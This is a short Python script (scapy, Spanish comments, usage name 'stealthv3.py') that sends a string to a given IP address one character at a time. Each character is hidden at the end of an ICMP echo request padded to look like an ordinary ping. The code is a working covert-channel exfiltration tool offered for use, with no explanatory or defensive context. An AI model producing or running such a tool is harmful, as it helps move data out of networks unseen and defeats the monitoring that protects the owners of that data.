from scapy.all import *
import time
import sys

def send_icmp_packets(ip, data_string):
    # Construir los campos fijos del paquete
    ip_pkt = IP(dst=ip, ttl=64, proto=1) # ICMP
    
    icmp_base = ICMP(type=8, code=0, id=0x1139)
    
    seq_num = 0
    
    for char in data_string:
        icmp_pkt = icmp_base.copy()
        icmp_pkt.seq = seq_num
        timestamp = int(time.time())
        
        # Timestamp seguido de 47 bytes de padding y el carácter del string al final
        data = timestamp.to_bytes(8, 'little') + b'\x00'*47 + bytes([ord(char)])
        
        # Combina todo para crear el paquete completo
        packet = ip_pkt/icmp_pkt/Raw(data)
        
        # Envía el paquete
        send(packet, verbose=False)
        
        # Incrementa el número de secuencia
        seq_num += 1
        
    print(f"Enviados {seq_num} paquetes ICMP a {ip}.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 stealthv3.py <dirección_ip> <string>")
        sys.exit(1)
    
    ip_address = sys.argv[1]
    data_string = sys.argv[2]

    send_icmp_packets(ip_address, data_string)
